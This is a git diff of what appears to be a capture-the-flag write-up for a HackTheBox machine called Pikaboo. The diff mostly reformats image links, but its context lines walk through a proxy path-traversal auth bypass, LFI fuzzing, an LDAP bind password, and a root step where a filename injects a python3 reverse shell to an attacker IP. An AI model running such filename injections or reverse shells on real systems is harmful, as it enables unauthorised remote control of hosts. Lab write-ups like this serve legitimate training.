@@ -23,23 +23,23 @@ Anonymous logins does not work for this site. We can take a look at the HTTP sit
 
 It's a Pokemon based website:
 
-<figure><img src="../../../.gitbook/assets/image (1968).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1968).png>)
 
 The admin portal requires credentials to access:
 
-<figure><img src="../../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1055).png>)
 
 We can take a look at the Pokatdex and see that there are entries for each specific creature. Props to the creator for designing these:
 
-<figure><img src="../../../.gitbook/assets/image (2462).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2462).png>)
 
 When we try to view the entries, we just see this:
 
-<figure><img src="../../../.gitbook/assets/image (3991).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3991).png>)
 
 The URL visited `http://10.129.95.191/pokeapi.php?id=6`, which might be relevant later on. I tested LFI and other types of injection, but nothing worked. I took a closer look at the administrator login, and found that if I keyed in wrong credentails, I got a unique error.
 
-<figure><img src="../../../.gitbook/assets/image (2718).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2718).png>)
 
 For some reason, it was redirecting me to port 81 on the localhost. This means that some type of proxy is being used to forward the traffic to the right destination. It's called a reverse proxy, and looking for exploits for it led me to this:
 
@@ -47,7 +47,7 @@ For some reason, it was redirecting me to port 81 on the localhost. This means t
 
 Based on the PoC, this is a misconfiguration regarding the proxy used for the `/admin` directory. We can test it out and find that we have bypassed authentication using this method and get a 403 instead.
 
-<figure><img src="../../../.gitbook/assets/image (3214).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3214).png>)
 
 I tried a `gobuster` scan on this new URL to see if we can find new files to access, and it seems `server-status` has been left publicly available.
 
@@ -89,7 +89,7 @@ There are loads of requests, and it seems that there's an extra directory at `ad
 
 This was a dashboard of some sort.
 
-<figure><img src="../../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(721).png>)
 
 The URL is `http://10.129.95.191/admin../admin_staging/index.php?page=dashboard.php`. This could be vulnerable to LFI. I used `wfuzz` to see what files existed on the page using the LFI wordlist. Ideally, we are looking for some type of configuration files.
 
@@ -112,13 +112,11 @@ ID           Response   Lines    Word       Chars       Payload
 
 It seems that we have found 2 files, and both of which have different lengths, indicating that something actually appeared on the page. When we view the FTP log file using `curl`, we find a username for FTP
 
-{% code overflow="wrap" %}
 ```
 Thu Jul  8 17:30:53 2021 [pid 21011] FTP command: Client "::ffff:10.10.14.6", "USER pwnmeow"
 Thu Jul  8 17:30:53 2021 [pid 21011] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "331 Please specify the password."
 Thu Jul  8 17:31:01 2021 [pid 21011] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "PASS <password>"
 ```
-{% endcode %}
 
 The weird part was that there was no password in sight, so we couldn't do much here.
 
@@ -167,7 +165,7 @@ Great, we now have RCE. We just need to include a `bash` reverse shell one-liner
 
 After viewing the page again, we would get a shell as `www-data`.
 
-<figure><img src="../../../.gitbook/assets/image (1413).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1413).png>)
 
 We can grab the user flag.
 
@@ -273,7 +271,6 @@ tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      
 
 The next step would be to enumerate LDAP via `ldapsearch`, which happened to be on the machine.
 
-{% code overflow="wrap" %}
 ```
 ldapsearch -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb'
 
@@ -374,7 +371,6 @@ result: 0 Success
 # numResponses: 11
 # numEntries: 10
 ```
-{% endcode %}
 
 We can find the user password in Base64 here, and when decoded it gives the password `_G0tT4_C4tcH'3m_4lL!_`
 
@@ -403,14 +399,12 @@ drwx-wx---    2 ftp      ftp          4096 Jul 06  2021 versions
 
 Based on the StackOverflow question, we have to name our file `| <insert bash command>.csv`. In my testing, it seems to reject `/` characters for some reason. So let's create a payload without all of that using a `python3` reverse shell.
 
-{% code overflow="wrap" %}
 ```
 ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.13\",4444));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"bash\")';.csv"
 ```
-{% endcode %}
 
 Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.
 
-<figure><img src="../../../.gitbook/assets/image (2355).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2355).png>)
 
 Rooted!
